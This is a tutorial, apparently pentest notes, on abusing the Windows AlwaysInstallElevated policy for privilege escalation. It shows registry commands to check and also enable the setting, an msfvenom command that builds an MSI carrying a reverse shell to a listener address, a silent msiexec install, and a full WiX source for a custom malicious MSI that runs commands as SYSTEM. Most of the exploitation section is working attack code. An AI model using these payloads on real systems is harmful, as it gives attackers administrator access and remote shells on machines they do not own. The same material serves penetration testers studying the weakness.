
---
### **1. What is "Always Install with Elevated Privileges"?**

- It's a Windows policy  setting that can allow users to install software with elevated
  permissions, even if not administrator.
    
- If enabled, any **MSI (Microsoft Installer) file** can run with elevated privileges.
    
- **Security risk:** Malicious users can exploit this to run arbitrary commands as an admin.
    

---

### **2. How to Check if it's Enabled**

#### **Method 1: Using Group Policy Editor (`gpedit.msc`)**

- Navigate to:
    
    ```
    Computer Configuration -> Administrative Templates -> Windows Components -> Windows Installer -> Always install with elevated privileges
    ```
    
    ```
    User Configuration -> Administrative Templates -> Windows Components -> Windows Installer
    ```
    

#### **Method 2: Using Command Line**

Run these two commands in PowerShell:

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
or 
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA

Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

- If both values are `1`, the setting is enabled.
    
- You can enable it manually:
    
    ```powershell
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -Value 1
    Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -Value 1
    ```
    

---

### **3. How to Exploit It**

#### **Step 1: Create a Malicious MSI File**

Using Metasploit:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi > sample.msi
```

This creates an MSI file that opens a **reverse shell**.

#### **Step 2: Execute the MSI File**

Run it with elevated privileges:

```bash
msiexec /quiet /qn /i sample.msi
```

This will **silently install** the package and execute the payload with **admin rights**.

---

### **4. How to Create a Custom Malicious MSI**

Instead of using Metasploit, you can **manually create an MSI** using WiX Toolset.

#### **Step 1: Install WiX**

1. Download **WiX Toolset v3.14.1** from [GitHub](https://github.com/wixtoolset/wix3/releases/tag/wix3141rtm).
    
2. Add WiX to your system `PATH`:
    
    ```cmd
    set PATH=%PATH%;"C:\Program Files (x86)\WiX Toolset v3.14\bin"
    ```
    

#### **Step 2: Create a WiX Project**

Write a `.wxs` (WiX Source) file to execute arbitrary commands:

```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product"
           Version="0.0.1" Manufacturer="Hacker" Language="1033">
    <Package InstallerVersion="200" Compressed="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLLOCATION" Name="Malware">
          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="ApplicationFiles"/>
    </Feature>
    <Property Id="cmdline">cmd.exe /C whoami /groups > C:\Users\Public\test.txt</Property>
    <CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
    <InstallExecuteSequence>
      <Custom Action="Stage1" After="InstallInitialize"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
```

#### **Step 3: Compile and Build the MSI**

```bash
candle sample.wxs
light.exe sample.wixobj
```

#### **Step 4: Run the Malicious MSI**

```bash
msiexec /quiet /qn /i sample.msi
```

---

### **5. References**

- [WiX Toolset](https://wixtoolset.org/)
    
- [Bypassing UAC with AlwaysInstallElevated](https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control)
    

---
